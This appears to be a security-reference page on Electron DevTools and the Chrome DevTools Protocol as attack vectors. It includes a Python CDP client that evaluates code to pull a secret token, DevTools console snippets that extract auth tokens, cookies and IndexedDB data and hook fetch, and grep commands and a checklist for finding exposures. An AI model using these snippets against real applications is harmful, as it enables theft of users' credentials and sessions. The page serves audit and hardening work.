---
title: DevTools Attack Surface
description: Chrome DevTools Protocol (CDP) and in-app DevTools as privilege escalation vectors
---

# DevTools Attack Surface

Chrome DevTools Protocol (CDP) is a comprehensive debug API that provides full code execution capability in the renderer — and via the renderer's IPC access, potentially in the main process. When DevTools is accessible in a production app, the attacker has a REPL. They don't need XSS, they don't need a preload bypass. They open the console and type.

DevTools in production is one of those findings that looks simple on paper but has high real-world impact. Most apps that leave it enabled do so accidentally — a dev-mode check that wasn't quite right, a keyboard shortcut registered globally and forgotten, an old debug flag left in the launch script.

---

## DevTools as an Attack Surface

When DevTools is accessible in a production app:

```
DevTools Console → JS execution in renderer
                 → Full access to contextBridge-exposed API
                 → IPC calls to every registered handler
                 → Exfiltrate localStorage, cookies, session data
                 → Read DOM (passwords in visible fields)
```

Even without nodeIntegration, DevTools gives an attacker:
- `window.electronAPI.*` — everything in contextBridge
- All registered IPC channels (via `ipcRenderer.invoke`)
- `localStorage`, `sessionStorage`, `indexedDB`
- `document.cookie`
- Network inspection (see all API calls, responses)
- Source debugging

---

## Opening DevTools When "Locked"

Some apps try to prevent DevTools access but miss vectors:

### F12 / Ctrl+Shift+I

```javascript
// App disables default keyboard shortcut:
Menu.setApplicationMenu(null);  // Removes default menu (and F12)

// But forgot global shortcut:
globalShortcut.register('F12', () => {
  win.webContents.openDevTools();  // Still opens DevTools
});
// Or: app registered accelerator 'F12' in Menu and user can still press it
```

### Right-Click Context Menu

```javascript
// Default Electron context menu includes "Inspect Element":
// If not disabled, right-click → Inspect → DevTools

// Disable context menu:
win.webContents.on('context-menu', (event) => {
  event.preventDefault();  // Block all context menus
});

// Or: override with custom menu that excludes "Inspect Element"
```

### --remote-debugging-port Flag

```bash
# Launch app with debugging port:
/path/to/myapp --remote-debugging-port=9222

# Connect from Chrome:
# chrome://inspect → Configure 127.0.0.1:9222 → Inspect target

# Full CDP access:
# Runtime.evaluate → arbitrary JS in any frame
# Network.getResponseBody → read all API responses
# Page.navigate → navigate renderer to any URL
```

### EnableNodeCliInspectArguments Fuse

If the `EnableNodeCliInspectArguments` fuse is **ON** (default before being disabled):

```bash
# --inspect flag works on the Electron main process:
myapp --inspect=9229
# → node.js debugger on port 9229
# → CDP connection → Runtime.evaluate in MAIN PROCESS
# → Full RCE in main process context

# Even more powerful than renderer DevTools
```

**Mitigation:** Set `EnableNodeCliInspectArguments` fuse to `false`.

---

## Chrome DevTools Protocol (CDP) Attacks

CDP is the protocol DevTools uses internally. If the CDP port is exposed:

```python
# Python: CDP client example
import websocket
import json

# Connect to exposed CDP:
ws = websocket.create_connection("ws://127.0.0.1:9222/json")
targets = json.loads(ws.recv())

# Connect to page target:
target_ws = targets[0]['webSocketDebuggerUrl']
page_ws = websocket.create_connection(target_ws)

# Execute arbitrary JS:
page_ws.send(json.dumps({
  "id": 1,
  "method": "Runtime.evaluate",
  "params": {
    "expression": "window.electronAPI.getSecretToken()",
    "returnByValue": True
  }
}))
result = json.loads(page_ws.recv())
print("Token:", result['result']['result']['value'])
```

### CDP via SSRF

If the renderer has `webSecurity: false`:

```javascript
// Renderer can reach localhost:
fetch('http://127.0.0.1:9222/json')
  .then(r => r.json())
  .then(targets => {
    const ws = targets[0].webSocketDebuggerUrl;
    // Connect to CDP and execute in any target including privileged frames
  });
```

---

## DevTools in Production — Finding It

```bash
# Find openDevTools calls in production code:
grep -rn "openDevTools" --include="*.js" . | \
  grep -v "node_modules\|isDev\|process\.env\.NODE_ENV.*develop\|__DEV__" | head -20

# Find --remote-debugging-port usage:
grep -rn "remote-debugging-port\|remoteDebuggingPort" \
  --include="*.js" . | grep -v node_modules

# Find F12 / Ctrl+Shift+I global shortcuts:
grep -rn "F12\|CommandOrControl+Shift+I\|CommandOrControl+Option+I" \
  --include="*.js" . | grep -v node_modules

# Find context menu inspect:
grep -rn "context-menu\|contextmenu\|inspect" --include="*.js" . | \
  grep -v "node_modules\|//.*inspect\|'do not inspect'" | head -20

# Find inspect flag handling:
grep -rn "inspect\b\|inspect-brk" --include="*.js" . | \
  grep "process\.argv\|commandLine\|switch\b" | grep -v node_modules
```

---

## Extracting App Secrets via DevTools

When DevTools is accessible, these extraction techniques work:

```javascript
// In DevTools console:

// 1. Extract all IPC channels (via preload leaks):
Object.keys(window)  // Shows all contextBridge-exposed APIs

// 2. Call any exposed API:
await window.electronAPI.getApiToken()

// 3. Read all stored data:
localStorage.getItem('authToken')
document.cookie

// 4. Read IndexedDB:
const req = indexedDB.open('AppDatabase');
req.onsuccess = (e) => {
  const db = e.target.result;
  const tx = db.transaction('tokens', 'readonly');
  tx.objectStore('tokens').getAll().onsuccess = r => console.log(r.target.result);
};

// 5. Intercept future requests (Network tab or:)
const originalFetch = window.fetch;
window.fetch = async (...args) => {
  const r = await originalFetch(...args);
  const clone = r.clone();
  clone.text().then(body => console.log('RESPONSE:', args[0], body));
  return r;
};
```

---

## DevTools Security Checklist

| Check | Production Safe | How to Verify |
|-------|----------------|---------------|
| No `openDevTools()` calls | ✅ Required | `grep -r openDevTools` |
| No F12 global shortcut | ✅ Required | `grep -r 'F12'` |
| Context menu disabled | ✅ Required | `grep -r context-menu` |
| `--remote-debugging-port` blocked | ✅ Required | App startup args |
| `EnableNodeCliInspectArguments` fuse off | ✅ Required | `npx @electron/fuses read` |
| `EnableNodeCliInspectArguments` checked in code | Optional | `grep -r inspect` argv |
